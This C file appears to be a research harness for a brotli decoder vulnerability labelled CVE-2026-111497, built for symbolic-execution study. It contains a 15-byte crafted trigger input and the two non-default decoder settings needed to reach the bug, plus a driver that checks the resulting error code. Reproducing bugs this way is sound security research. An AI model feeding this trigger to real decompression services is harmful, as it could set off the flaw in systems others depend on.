// This project's own harness code (NOT part of brotli itself): calls the real, unmodified brotli decoder
// API (see brotli_amalgamated.c) the same way any real caller would. See README.md in this directory for
// full context (what CVE-2026-111497 is, why these two non-default decoder parameters are required, the
// 15-byte trigger input, and pointers into docs/DESIGN.md for the investigation history).
#include <stddef.h>
#include "brotli/decode.h"

// The real, 15-byte, hand-crafted CVE-2026-111497 trigger -- see README.md for how this was derived
// (docs/DESIGN.md Sec.22.301). Confirmed against the real, unmodified decoder (with the two decoder
// parameters set below) to return BROTLI_DECODER_ERROR_FORMAT_BLOCK_SWITCH (-17).
static const unsigned char kBrotliCve202611497Trigger[15] = {
    0x11, 0x59, 0xfe, 0xff, 0xff, 0x03, 0x80, 0x00, 0x08, 0xfc, 0x02, 0xe0, 0xf7, 0xf4, 0x1f,
};
// Same bytes as a hex string, for convenience when constructing a --spec-dir `where:` spec or a klee_assume
// chain elsewhere: 11 59 fe ff ff 03 80 00 08 fc 02 e0 f7 f4 1f

// consume(): the entry point this whole investigation has driven HLIR/KLEE at, unchanged in shape across
// docs/DESIGN.md Sec.22.288 onward. `in`/`in_len` are the only attacker-controlled inputs; everything else
// (the two BrotliDecoderSetParameter calls) is fixed, matching the structural-unreachability proof in
// Sec.22.301 (the bug needs these two non-default parameters, with default parameters it cannot be reached
// at all -- that is not a limitation of this harness, it's a property of the real bug).
int consume(const unsigned char *in, int in_len) {
  if (in_len < 0) return -1;
  BrotliDecoderState *s = BrotliDecoderCreateInstance(NULL, NULL, NULL);
  if (!s) return -2;
  BrotliDecoderSetParameter(s, BROTLI_DECODER_PARAM_LARGE_WINDOW, 1);
  BrotliDecoderSetParameter(s, BROTLI_DECODER_PARAM_DISABLE_RING_BUFFER_REALLOCATION, 1);

  static unsigned char out[1 << 25];
  const unsigned char *next_in = in;
  size_t avail_in = (size_t)in_len;
  unsigned char *next_out = out;
  size_t avail_out = sizeof(out);
  size_t total_out = 0;

  BrotliDecoderResult r =
      BrotliDecoderDecompressStream(s, &avail_in, &next_in, &avail_out, &next_out, &total_out);

  int rc = (int)r;
  BrotliDecoderDestroyInstance(s);
  return rc;
}

#ifdef BROTLI_CVE_NATIVE_MAIN
// A tiny native driver for the fidelity check in build_amalgamation.sh / README.md. Deliberately does NOT
// call consume() for the actual check: consume()'s return value is only the generic BrotliDecoderResult enum
// (0=ERROR/1=SUCCESS/2=NEEDS_MORE_INPUT/3=NEEDS_MORE_OUTPUT -- matching the exact shape this investigation's
// HLIR/KLEE harnesses have used throughout, see docs/DESIGN.md), which does NOT distinguish BLOCK_SWITCH (-17)
// from any other decoder error. The specific error code needs a separate BrotliDecoderGetErrorCode() call
// after the state reports BROTLI_DECODER_RESULT_ERROR, which consume() doesn't expose (keeping it identical
// in shape to the real investigation's harness is the point). So this driver calls the real decoder API
// directly, the same way docs/DESIGN.md Sec.22.301's original verification probe did.
#include <stdio.h>
int main(void) {
  BrotliDecoderState *s = BrotliDecoderCreateInstance(NULL, NULL, NULL);
  BrotliDecoderSetParameter(s, BROTLI_DECODER_PARAM_LARGE_WINDOW, 1);
  BrotliDecoderSetParameter(s, BROTLI_DECODER_PARAM_DISABLE_RING_BUFFER_REALLOCATION, 1);

  static unsigned char out[1 << 25];
  const unsigned char *next_in = kBrotliCve202611497Trigger;
  size_t avail_in = sizeof(kBrotliCve202611497Trigger);
  unsigned char *next_out = out;
  size_t avail_out = sizeof(out);
  size_t total_out = 0;

  BrotliDecoderResult r =
      BrotliDecoderDecompressStream(s, &avail_in, &next_in, &avail_out, &next_out, &total_out);
  printf("BrotliDecoderResult = %d\n", (int)r);

  int ok = 0;
  if (r == BROTLI_DECODER_RESULT_ERROR) {
    BrotliDecoderErrorCode ec = BrotliDecoderGetErrorCode(s);
    printf("BrotliDecoderErrorCode = %d (%s)\n", (int)ec, BrotliDecoderErrorString(ec));
    ok = (ec == BROTLI_DECODER_ERROR_FORMAT_BLOCK_SWITCH);
  } else {
    printf("did not error (result=%d) -- amalgamation is NOT faithful, investigate\n", (int)r);
  }
  BrotliDecoderDestroyInstance(s);
  return ok ? 0 : 1;
}
#endif
